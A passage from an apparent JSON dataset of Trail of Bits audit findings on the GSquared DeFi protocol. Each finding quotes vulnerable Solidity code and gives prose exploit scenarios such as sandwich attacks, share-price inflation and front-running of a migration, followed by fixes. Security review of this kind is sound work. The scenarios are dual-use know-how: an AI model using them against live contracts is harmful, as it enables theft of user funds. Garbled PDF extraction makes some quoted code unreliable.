newly received tokens are used for the operations. Long term, create an external skim function that can be used to skim any excess tokens in the contract. Additionally, ensure that the user documentation highlights that users should not transfer tokens directly to the GRouter and should instead use the web interface or call the deposit and withdraw functions. Finally, ensure that token airdrops or unexpected transfers can only benet the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Uninformative implementation of maxDeposit and maxMint from EIP-4626 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The GVault implementation of EIP-4626 is uninformative for maxDeposit and maxMint, as they return only xed, extreme values. EIP-4626 is a standard to implement tokenized vaults. In particular, the following is specied:  maxDeposit : MUST factor in both global and user-specic limits, like if deposits are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.  maxMint : MUST factor in both global and user-specic limits, like if mints are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited. The current implementation of maxDeposit and maxMint in the GVault contract directly return the maximum value of the uint256 type: /// @notice The maximum amount a user can deposit into the vault function maxDeposit ( address ) public pure override returns ( uint256 maxAssets ) return type( uint256 ).max; 293 294 295 296 297 298 299 { 300 301 } . . . 315 316 317 318 } /// @notice maximum number of shares that can be minted function maxMint ( address ) public pure override returns ( uint256 maxShares ) { return type( uint256 ).max; Figure 4.1: The maxDeposit and maxMint functions from GVault.sol This implementation, however, does not provide any valuable information to the user and may lead to faulty integrations with third-party systems. Exploit Scenario A third-party protocol wants to deposit into a GVault . It rst calls maxDeposit to know the maximum amount of asserts it can deposit and then calls deposit . However, the latter function call will revert because the value is too large. Recommendations Short term, return suitable values in maxDeposit and maxMint by considering the amount of assets owned by the caller as well any other global condition (e.g., a contract is paused). Long term, ensure compliance with the EIP specication that is being implemented (in this case, EIP-4626).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. moveStrategy runs of out gas for large inputs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "Reordering strategies can trigger operations that will run out-of-gas before completion. A GVault contract allows dierent strategies to be added into a queue. Since the order of them is important, the contract provides moveStrategy , a function to let the owner to move a strategy to a certain position of the queue. 500 501 502 503 504 505 506 507 508 509 510 511 } /// @notice Move the strategy to a new position /// @param _strategy Target strategy to move /// @param _pos desired position of strategy /// @dev if the _pos value is >= number of strategies in the queue, /// the strategy will be moved to the tail position function moveStrategy ( address _strategy , uint256 _pos ) external onlyOwner { uint256 currentPos = getStrategyPositions(_strategy); uint256 _strategyId = strategyId[_strategy]; if (currentPos > _pos) move( uint48 (_strategyId), uint48 (currentPos - _pos), false ); else move( uint48 (_strategyId), uint48 (_pos - currentPos), true ); Figure 5.1: The moveStrategy function from GVault.sol The documentation states that if the position to move a certain strategy is larger than the number of strategies in the queue, then it will be moved to the tail of the queue. This implemented using the move function: 171 172 173 174 175 176 177 178 179 180 181 182 ) internal { /// @notice move a strategy to a new position in the queue /// @param _id id of strategy to move /// @param _steps number of steps to move the strategy /// @param _back move towards tail (true) or head (false) /// @dev Moves a strategy a given number of steps. If the number /// of steps exceeds the position of the head/tail, the /// strategy will take the place of the current head/tail function move ( uint48 _id , uint48 _steps , bool _back 183 184 185 186 187 188 189 190  Strategy storage oldPos = nodes[_id]; if (_steps == 0 ) return ; if (oldPos.strategy == ZERO_ADDRESS) revert NoIdEntry(_id); uint48 _newPos = !_back ? oldPos.prev : oldPos.next; for ( uint256 i = 1 ; i < _steps; i++) { _newPos = !_back ? nodes[_newPos].prev : nodes[_newPos].next; } Figure 5.2: The header of the move function from StrategyQueue.sol However, if a large number of steps is used, the loop will never nish without running out of gas. A similar issue aects StrategyQueue.withdrawalQueue , if called directly. Exploit Scenario Alice creates a smart contract that acts as the owner of a GVault. She includes code to reorder strategies using a call to moveStrategy . Since she wants to ensure that a certain strategy is always moved to the end of the queue, she uses a very large value as the position. When the code runs, it will always run out of gas, blocking the operation. Recommendations Short term, ensure the execution of the move ends in a number of steps that is bounded by the number of strategies in the queue. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. GVault withdrawals from ConvexStrategy are vulnerable to sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "Token swaps that may be executed during vault withdrawals are vulnerable to sandwich attacks. Note that this is applicable only if a user withdraws directly from the GVault , not through the GRouter contract. The ConvexStrategy contract performs token swaps through Uniswap V2, Uniswap V3, and Curve. All platforms allow the caller to specify the minimum-amount-out value, which indicates the minimum amount of tokens that a user wishes to receive from a swap. This provides protection against illiquid pools and sandwich attacks. Many of the swaps that the ConvexStrategy contract performs have the minimum-amount-out value hardcoded to zero. But a majority of these swaps can be triggered only by a Gelato keeper, which uses a private channel to relay all transactions. Thus, these swaps cannot be sandwiched. However, this is not the case with the ConvexStrategy.withdraw function. The withdraw function will be called by the GVault contract if the GVault does not have enough tokens for a user withdrawal. If the balance is not sucient, ConvexStrategy.withdraw will be called to retrieve additional assets to complete the withdrawal request. Note that the transaction to withdraw assets from the protocol will be visible in the public mempool (gure 6.1). function withdraw ( uint256 _amount ) 771 772 773 774 { 775 776 777 778 779 780 781 782 783 784 785 external returns ( uint256 withdrawnAssets , uint256 loss ) if ( msg.sender != address (VAULT)) revert StrategyErrors.NotVault(); ( uint256 assets , uint256 balance , ) = _estimatedTotalAssets( false ); // not enough assets to withdraw if (_amount >= assets) { balance += sellAllRewards(); balance += divestAll( false ); if (_amount > balance) { loss = _amount - balance; withdrawnAssets = balance; } else { withdrawnAssets = _amount; 786 787 788 789 790 791 792 793 794 795 796 797 798 799 800 801 802 803 804 805 806 807 808 809 810 811 812 } } } else { // check if there is a loss, and distribute it proportionally // if it exists uint256 debt = VAULT.getStrategyDebt(); if (debt > assets) { loss = ((debt - assets) * _amount) / debt; _amount = _amount - loss; } if (_amount <= balance) { withdrawnAssets = _amount; } else { withdrawnAssets = divest(_amount - balance, false ) + balance; if (withdrawnAssets < _amount) { loss += _amount - withdrawnAssets; } else { if (loss > withdrawnAssets - _amount) { loss -= withdrawnAssets - _amount; } else { loss = 0 ; } } } } ASSET.transfer( msg.sender , withdrawnAssets); return (withdrawnAssets, loss); Figure 6.1: The withdraw function in ConvexStrategy.sol#L771-812 In the situation where the _amount that needs to be withdrawn is more than or equal to the total number of assets held by the contract, the withdraw function will call sellAllRewards and divestAll with _ slippage set to false (see the highlighted portion of gure 6.1). The sellAllRewards function, which will call _sellRewards , sells all the additional reward tokens provided by Convex, its balance of CRV, and its balance of CVX for WETH. All these swaps have a hardcoded value of zero for the minimum-amount-out. Similarly, if _ slippage is set to false when calling divestAll , the swap species a minimum-amount-out of zero. By specifying zero for all these token swaps, there is no guarantee that the protocol will receive any tokens back from the trade. For example, if one or more of these swaps get sandwiched during a call to withdraw , there is an increased risk of reporting a loss that will directly aect the amount the user is able to withdraw. Exploit Scenario Alice makes a call to withdraw to remove some of her funds from the protocol. Eve notices this call in the public transaction mempool. Knowing that the contract will have to sell some of its rewards, Eve identies a pure prot opportunity and sandwiches one or more of the swaps performed during the transaction. The strategy now has to report a loss, which results in Alice receiving less than she would have otherwise. Recommendations Short term, for _sellRewards , use the same minAmount calculation as in divestAll but replace debt with the contracts balance of a given reward token. This can be applied for all swaps performed in _sellRewards . For divestAll , set _slippage to true instead of false when it is called in withdraw . Long term, document all cases in which front-running may be possible and its implications for the codebase. Additionally, ensure that all users are aware of the risks of front-running and arbitrage when interacting with the GSquared system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Stop loss primer cannot be deactivated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The stop loss primer cannot be deactivated because the keeper contract uses the incorrect function to check whether or not the meta pool has become healthy again. The stop loss primer is activated if the meta pool that is being used for yield becomes unhealthy. A meta pool is unhealthy if the price of the 3CRV token deviates from the expected price for a set amount of time. The primer can also be deactivated if, after it has been activated, the price of the token stabilizes back to a healthy value. Deactivating the primer is a critical feature because if the pool becomes healthy again, there is no reason to divest all of the strategys funds, take potential losses, and start all over again. The GStrategyResolver contract, which is called by a Gelato keeper, will check to identify whether a primer can be deactivated. This is done via the taskStopStopLossPrimer function. The function will attempt to call the GStrategyGuard.endStopLoss function to see whether the primer can be deactivated (gure 7.1). function taskStopStopLossPrimer () external view returns ( bool canExec , bytes memory execPayload) IGStrategyGuard executor = IGStrategyGuard(stopLossExecutor); if (executor.endStopLoss()) { canExec = true ; execPayload = abi.encodeWithSelector( executor.stopStopLossPrimer.selector ); } 46 47 48 49 50 { 51 52 53 54 55 56 57 58 } Figure 7.1: The taskStopStopLossPrimer function in GStrategyResolver.sol#L46-58 However, the GStrategyGuard contract does not have an endStopLoss function. Instead, it has a canEndStopLoss function. Note that the executor variable in taskStopStopLossPrimer is expected to implement the IGStrategyGuard function, which does have an endStopLoss function. However, the GStrategyGuard contract implements the IGuard interface, which does not have the endStopLoss function. Thus, the call to endStopLoss will simply return, which is equivalent to returning false , and the primer will not be deactivated. Exploit Scenario Due to market conditions, the price of the 3CRV token drops signicantly for an extended period of time. This triggers the Gelato keeper to activate the stop loss primer. Soon after, the price of the 3CRV token restabilizes. However, because of the incorrect function call in the taskStopStopLossPrimer function, the primer cannot be deactivated, the stop loss process completes, and all the funds in the strategy must be divested. Recommendations Short term, change the function call from endStopLoss to canEndStopLoss in taskStopStopLossPrimer . Long term, ensure that there are no near-duplicate interfaces for a given contract in the protocol that may lead to an edge case similar to this. Additionally, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. getYieldTokenAmount uses convertToAssets instead of convertToShares ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The getYieldTokenAmount function does not properly convert a 3CRV token amount into a G3CRV token amount, which may allow a user to withdraw more or less than expected or lead to imbalanced tranches after a migration. The expected behavior of the getYieldTokenAmount function is to return the number of G3CRV tokens represented by a given 3CRV amount. For withdrawals, this will determine how many G3CRV tokens should be returned back to the GRouter contract. For migrations, the function is used to gure out how many G3CRV tokens should be allocated to the senior and junior tranches. To convert a given amount of 3CRV to G3CRV, the GVault.convertToShares function should be used. However, the getYieldTokenAmount function uses the GVault.convertToAssets function (gure 8.1). Thus, getYieldTokenAmount takes an amount of 3CRV tokens and treats it as shares in the GVault , instead of assets. 169 170 171 172 173 { 174 175 } function getYieldTokenAmount ( uint256 _index , uint256 _amount ) internal view returns ( uint256 ) return getYieldToken(_index).convertToAssets(_amount); Figure 8.1: The getYieldTokenAmount function in GTranche.sol#L169-175 If the system is protable, each G3CRV share should be worth more over time. Thus, getYieldTokenAmount will return a value larger than expected because one share is worth more than one asset. This allows a user to withdraw more from the GTranche contract than they should be able to. Additionally, a protable system will cause the senior tranche to receive more G3CRV tokens than expected during migrations. A similar situation can happen if the system is not protable. Exploit Scenario Alice deposits $100 worth of USDC into the system. After a certain amount of time, the GSquared protocol becomes protable and Alice should be able to withdraw $110, making $10 in prot. However, due to the incorrect arithmetic performed in the getYieldTokenAmount function, Alice is able to withdraw $120 of USDC. Recommendations Short term, use convertToShares instead of convertToAssets in getYieldTokenAmount . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. convertToShares can be manipulated to block deposits ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "An attacker can block operations by using direct token transfers to manipulate convertToShares , which computes the amount of shares to deposit. convertToShares is used in the GVault code to know how many shares correspond to certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 9.1: The convertToShares function in GVault.sol This function relies on the _freeFunds function to calculate the amount of shares: 706 707 708 709 710 } /// @notice the number of total assets the GVault has excluding and profits /// and losses function _freeFunds () internal view returns ( uint256 ) { return _totalAssets() - _calculateLockedProfit(); Figure 9.2: The _freeFunds function in GVault.sol In the simplest case, _calculateLockedProfit() can be assumed as zero if there is no locked prot. The _totalAssets function is implemented as follows: 820 821 /// @notice Vault adapters total assets including loose assets and debts /// @dev note that this does not consider estimated gains/losses from the strategies 822 823 824 } function _totalAssets () private view returns ( uint256 ) { return asset.balanceOf( address ( this )) + vaultTotalDebt; Figure 9.3: The _totalAssets function in GVault.sol However, the fact that _totalAssets has a lower bound determined by asset.balanceOf(address(this)) can be exploited to manipulate the result by \"donating\" assets to the GVault address. Exploit Scenario Alice deploys a new GVault. Eve observes the deployment and quickly transfers an amount of tokens to the GVault address. One of two scenarios can happen: 1. 2. Eve transfers a minimal amount of tokens, forcing a positive amount of freeFunds . This will block any immediate calls to deposit, since it will result in zero shares to be minted. Eve transfers a large amount of tokens, forcing future deposits to be more expensive or resulting in zero shares. Every new deposit can increase the amount of free funds, making the eect more severe. It is important to note that although Alice cannot use the deposit function, she can still call mint to bypass the exploit. Recommendations Short term, use a state variable, assetBalance , to track the total balance of assets in the contract. Avoid using balanceOf , which is prone to manipulation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Harvest operation could be blocked if eligibility check on a strategy reverts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "During harvest, if any of the strategies in the queue were to revert, it would prevent the loop from reaching the end of the queue and also block the entire harvest operation. When the harvest function is executed, a loop iterates through each of the strategies in the strategies queue, and the canHarvest() check runs on each strategy to determine if it is eligible for harvesting; if it is, the harvest logic is executed on that strategy. 312 313 314 315 316 317 318 319 320 321 322 /// @notice Execute strategy harvest function harvest () external { if ( msg.sender != keeper) revert GuardErrors.NotKeeper(); uint256 strategiesLength = strategies.length; for ( uint256 i ; i < strategiesLength; i++) { address strategy = strategies[i]; if (strategy == address ( 0 )) continue ; if (IStrategy(strategy).canHarvest()) { if (strategyCheck[strategy].active) { IStrategy(strategy).runHarvest(); try IStrategy(strategy).runHarvest() {} catch Error( ... Figure 10.1: The harvest function in GStrategyGuard.sol However, if the canHarvest() check on a particular strategy within the loop reverts, external calls from the canHarvest() function to check the status of rewards could also revert. Since the call to canHarvest() is not inside of a try block, this would prevent the loop from proceeding to the next strategy in the queue (if there is one) and would block the entire harvest operation. Additionally, within the harvest function, the runHarvest function is called twice on a strategy on each iteration of the loop. This could lead to unnecessary waste of gas and possibly undened behavior. Recommendations Short term, wrap external calls within the loop in try and catch blocks, so that reverts can be handled gracefully without blocking the entire operation. Additionally, ensure that the canHarvest function of a strategy can never revert. Long term, carefully audit operations that consume a large amount of gas, especially those in loops. Additionally, when designing logic loops that make external calls, be mindful as to whether the calls can revert, and wrap them in try and catch blocks when necessary.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Incorrect rounding direction in GVault ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The minting and withdrawal operations in the GVault use rounding in favor of the user instead of the protocol, giving away a small amount of shares or assets that can accumulate over time . convertToShares is used in the GVault code to know how many shares correspond to a certain amount of assets: 394 395 396 397 398 399 400 401 { 402 /// @notice Value of asset in shares /// @param _assets amount of asset to convert to shares function convertToShares ( uint256 _assets ) public view override returns ( uint256 shares ) uint256 freeFunds_ = _freeFunds(); // Saves an extra SLOAD if _freeFunds is non-zero. 403 404 } return freeFunds_ == 0 ? _assets : (_assets * totalSupply) / freeFunds_; Figure 11.1: The convertToShares function in GVault.sol This function rounds down, providing slightly fewer shares than expected for some amount of assets. Additionally, convertToAssets i s used in the GVault code to know how many assets correspond to certain amount of shares: 406 /// @notice Value of shares in underlying asset /// @param _shares amount of shares to convert to tokens function convertToAssets ( uint256 _shares ) 407 408 409 410 411 412 413 { public view override returns ( uint256 assets ) 414 uint256 _totalSupply = totalSupply; // Saves an extra SLOAD if _totalSupply is non-zero. 415 416 417 418 419 } return _totalSupply == 0 ? _shares : ((_shares * _freeFunds()) / _totalSupply); Figure 11.2: The convertToAssets function in GVault.sol This function also rounds down, providing slightly fewer assets than expected for some amount of shares. However, the mint function uses previewMint , which uses convertToAssets : 204 205 206 207 208 209 { 210 211 212 213 214 215 216 217 218 219 220 } function mint ( uint256 _shares , address _receiver ) external override nonReentrant returns ( uint256 assets ) // Check for rounding error in previewMint. if ((assets = previewMint(_shares)) == 0 ) revert Errors.ZeroAssets(); _mint(_receiver, _shares); asset.safeTransferFrom( msg.sender , address ( this ), assets); emit Deposit( msg.sender , _receiver, assets, _shares); return assets; Figure 12.3: The mint function in GVault.sol This means that the function favors the user, since they get some xed amount of shares for a rounded-down amount of assets. In a similar way, the withdraw function uses convertToShares : function withdraw ( uint256 _assets , address _receiver , address _owner 227 228 229 230 231 ) external override nonReentrant returns ( uint256 shares ) { 232 if (_assets == 0 ) revert Errors.ZeroAssets(); 233 234 235 236 shares = convertToShares(_assets); if (shares > balanceOf[_owner]) revert Errors.InsufficientShares(); 237 238 239 if ( msg.sender != _owner) { uint256 allowed = allowance[_owner][ msg.sender ]; // Saves gas for limited approvals. 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 } if (allowed != type( uint256 ).max) allowance[_owner][ msg.sender ] = allowed - shares; } _assets = beforeWithdraw(_assets, asset); _burn(_owner, shares); asset.safeTransfer(_receiver, _assets); emit Withdraw( msg.sender , _receiver, _owner, _assets, shares); return shares; Figure 11.4: The withdraw function in GVault.sol This means that the function favors the user, since they get some xed amount of assets for a rounded-down amount of shares. This issue should also be also considered when minting fees, since they should favor the protocol instead of the user or the strategy. Exploit Scenario Alice deploys a new GVault and provides some liquidity. Eve uses mints and withdrawals to slowly drain the liquidity, possibly aecting the internal bookkeeping of the GVault. Recommendations Short term, consider refactoring the GVault code to specify the rounding direction across the codebase in order keep the error in favor of the user or the protocol. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Protocol migration is vulnerable to front-running and a loss of funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The migration from Gro protocol to GSquared protocol can be front-run by manipulating the share price enough that the protocol loses a large amount of funds. The GMigration contract is responsible for initiating the migration from Gro to GSquared. The G Migration.prepareMigration function will deposit liquidity into the three-pool and then attempt to deposit the 3CRV LP token into the GVault contract in exchange for G3CRV shares (gure 12.1). Note that this migration occurs on a newly deployed GVault contract that holds no assets and has no supply of shares. 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 function prepareMigration ( uint256 minAmountThreeCRV ) external onlyOwner { if (!IsGTrancheSet) { revert Errors.TrancheNotSet(); } // read senior tranche value before migration seniorTrancheDollarAmount = SeniorTranche(PWRD).totalAssets(); uint256 DAI_BALANCE = ERC20(DAI).balanceOf( address ( this )); uint256 USDC_BALANCE = ERC20(USDC).balanceOf( address ( this )); uint256 USDT_BALANCE = ERC20(USDT).balanceOf( address ( this )); // approve three pool ERC20(DAI).safeApprove(THREE_POOL, DAI_BALANCE); ERC20(USDC).safeApprove(THREE_POOL, USDC_BALANCE); ERC20(USDT).safeApprove(THREE_POOL, USDT_BALANCE); // swap for 3crv IThreePool(THREE_POOL).add_liquidity( [DAI_BALANCE, USDC_BALANCE, USDT_BALANCE], minAmountThreeCRV ); //check 3crv amount received uint256 depositAmount = ERC20(THREE_POOL_TOKEN).balanceOf( address ( this ) ); // approve 3crv for GVault ERC20(THREE_POOL_TOKEN).safeApprove( address (gVault), depositAmount); // deposit into GVault uint256 shareAmount = gVault.deposit(depositAmount, address ( this )); // approve gVaultTokens for gTranche ERC20( address (gVault)).safeApprove( address (gTranche), shareAmount); 89 90 91 92 93 94 95 96 97 98 } } Figure 12.1: The prepareMigration function in GMigration.sol#L61-98 However, this prepareMigration function call is vulnerable to a share price ination attack. As noted in this issue , the end result of the attack is that the shares (G3CRV) that the GMigration contract will receive can redeem only a portion of the assets that were originally deposited by GMigration into the GVault contract. This occurs because the rst depositor in the GVault is capable of manipulating the share price signicantly, which is compounded by the fact that the deposit function in GVault rounds in favor of the protocol due to a division in convertToShares (see TOB-GRO-11 ). Exploit Scenario Alice, a GSquared developer, calls prepareMigration to begin the process of migrating funds from Gro to GSquared. Eve notices this transaction in the public mempool, and front-runs it with a small deposit and a large token (3CRV) airdrop. This leads to a signicant change in the share price. The prepareMigration call completes, but GMigration is left with a small, insucient amount of shares because it has suered from truncation in the convertToShares function. These shares can be redeemed for only a portion of the original deposit. Recommendations Short term, perform the GSquared system deployment and protocol migration using a private relay. This will mitigate the risk of front-running the migration or price share manipulation. Long term, implement the short- and long-term recommendations outlined in TOB-GRO-11 . Additionally, implement an ERC4626Router similar to Fei protocols implementation so that a minimum-amount-out can be specied for deposit, mint, redeem, and withdraw operations. References   ERC4626RouterBase.sol ERC4626 share price ination",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Incorrect slippage calculation performed during strategy investments and divestitures ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The incorrect arithmetic calculation for slippage tolerance during strategy investments and divestitures can lead to an increased rate of failed prot-and-loss (PnL) reports and withdrawals. The ConvexStrategy contract is tasked with investing excess funds into a meta pool to obtain yield and divesting those funds from the pool whenever necessary. Investments are done via the invest function, and divestitures for a given amount are done via the divest function. Both functions have the ability to manage the amount of slippage that is allowed during the deposit and withdrawal from the meta pool. For example, in the divest function, the withdrawal will go through only if the amount of 3CRV tokens that will be transferred out from the pool (by burning meta pool tokens) is greater than or equal to the _debt , the amount of 3CRV that needs to be transferred out from the pool, discounted by baseSlippage (gure 13.1). Thus, both sides of the comparison must have units of 3CRV. 883 884 885 886 887 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 function divest ( uint256 _debt , bool _slippage ) internal returns ( uint256 ) { uint256 meta_amount = ICurveMeta(metaPool).calc_token_amount( [ 0 , _debt], false ); if (_slippage) { uint256 ratio = curveValue(); if ( (meta_amount * PERCENTAGE_DECIMAL_FACTOR) / ratio < ((_debt * (PERCENTAGE_DECIMAL_FACTOR - baseSlippage)) / PERCENTAGE_DECIMAL_FACTOR) revert StrategyErrors.LTMinAmountExpected(); ) { } } Rewards(rewardContract).withdrawAndUnwrap(meta_amount, false ); return ICurveMeta(metaPool).remove_liquidity_one_coin( meta_amount, CRV3_INDEX, 904 905 } ); Figure 13.1: The divest function in ConvexStrategy.sol#L883-905 To calculate the value of a meta pool token (mpLP) in terms of 3CRV, the curveValue function is called (gure 13.2). The units of the return value, ratio , are 3CRV/mpLP. 1170 1171 1172 1173 1174 } function curveValue () internal view returns ( uint256 ) { uint256 three_pool_vp = ICurve3Pool(CRV_3POOL).get_virtual_price(); uint256 meta_pool_vp = ICurve3Pool(metaPool).get_virtual_price(); return (meta_pool_vp * PERCENTAGE_DECIMAL_FACTOR) / three_pool_vp; Figure 13.2: The curveValue function in ConvexStrategy.sol#L1170-1174 However, note that in gure 13.1, meta_amount value, which is the amount of mpLP tokens that need to be burned, is divided by ratio . From a unit perspective, this is multiplying an mpLP amount by a mpLP/3CRV ratio. The resultant units are not 3CRV. Instead, the arithmetic should be meta_amount multiplied by ratio. This would be mpLP times 3CRV/mpLP, which would result in the nal units of 3CRV. Assuming 3CRV/mpLP is greater than one, the division instead of multiplication will result in a smaller value, which increases the likelihood that the slippage tolerance is not met. The invest and divest functions are called during PnL reporting and withdrawals. If there is a higher risk for the functions to revert because the slippage tolerance is not met, the likelihood of failed PnL reports and withdrawals also increases. Exploit Scenario Alice wishes to withdraw some funds from the GSquared protocol. She calls GRouter.withdraw and with a reasonable minAmount . The GVault contract calls the ConvexStrategy contract to withdraw some funds to meet the necessary withdrawal amount. The strategy attempts to divest the necessary amount of funds. However, due to the incorrect slippage arithmetic, the divest function reverts and Alices withdrawal is unsuccessful. Recommendations Short term, in divest , multiply meta_amount by ratio . In invest , multiply amount by ratio . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Potential division by zero in _calcTrancheValue ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "Junior tranche withdrawals may fail due to an unexpected division by zero error. One of the key steps performed during junior tranche withdrawals is to identify the dollar value of the tranche tokens that will be burned by calling _calcTrancheValue (gure 14.1). function _calcTrancheValue ( bool _tranche , uint256 _amount , uint256 _total 559 560 561 562 563 ) public view returns ( uint256 ) { 564 565 566 567 568 } uint256 factor = getTrancheToken(_tranche).factor(_total); uint256 amount = (_amount * DEFAULT_FACTOR) / factor; if (amount > _total) return _total; return amount; Figure 14.1: The _calcTrancheValue function in GTranche.sol#L559-568 To calculate the dollar value, the factor function is called to identify how many tokens represent one dollar. The dollar value, amount , is then the token amount provided, _amount , divided by factor . However, an edge case in the factor function will occur if the total supply of tranche tokens (junior or senior) is non-zero while the amount of assets backing those tokens is zero. Practically, this can happen only if the system is exposed to a loss large enough that the assets backing the junior tranche tokens are completely wiped. In this edge case, the factor function returns zero (gure 14.2). The subsequent division by zero in _calcTrancheValue will cause the transaction to revert. 525 526 527 528 529 function factor ( uint256 _totalAssets ) public view override returns ( uint256 ) 530 { 531 532 533 534 535 536 537 538 539 if (totalSupplyBase() == 0 ) { return getInitialBase(); } if (_totalAssets > 0 ) { return totalSupplyBase().mul(BASE).div(_totalAssets); } // This case is totalSupply > 0 && totalAssets == 0, and only occurs on system loss 540 541 } return 0 ; Figure 14.2: The factor function in GToken.sol#L525-541 It is important to note that if the system enters a state where there are no assets backing the junior tranche, junior tranche token holders would be unable to withdraw anyway. However, this division by zero should be caught in _calcTrancheValue , and the requisite error code should be thrown. Recommendations Short term, add a check before the division to ensure that factor is greater than zero. If factor is zero, throw a custom error code specically created for this situation. Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Token withdrawals from GTranche are sent to the incorrect address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The GTranche withdrawal function takes in a _recipient address to send the G3CRV shares to, but instead sends those shares to msg.sender (gure 15.1). 212 213 214 215 216 217 ) 218 219 220 221 { function withdraw ( uint256 _amount , uint256 _index , bool _tranche , address _recipient external override returns ( uint256 yieldTokenAmounts , uint256 calcAmount ) trancheToken.burn( msg.sender , factor, calcAmount); token.transfer( msg.sender , yieldTokenAmounts); . [...] . 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 } emit LogNewWithdrawal( msg.sender , _recipient, _amount, _index, _tranche, yieldTokenAmounts, calcAmount ); return (yieldTokenAmounts, calcAmount); Figure 15.1: The withdraw function in GTranche.sol#L219-259 Since GTranche withdrawals are performed by the GRouter contract on behalf of the user, the msg.sender and _recipient address are the same. However, a direct call to GTranche.withdraw by a user could lead to unexpected consequences. Recommendations Short term, change the destination address to _recipient instead of msg.sender . Long term, increase unit test coverage to include tests directly on GTranche and associated contracts in addition to performing the unit tests through the GRouter contract.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The GSquared Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions  was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the GSquared Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. AntePoolFactory does not validate create2 return addresses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
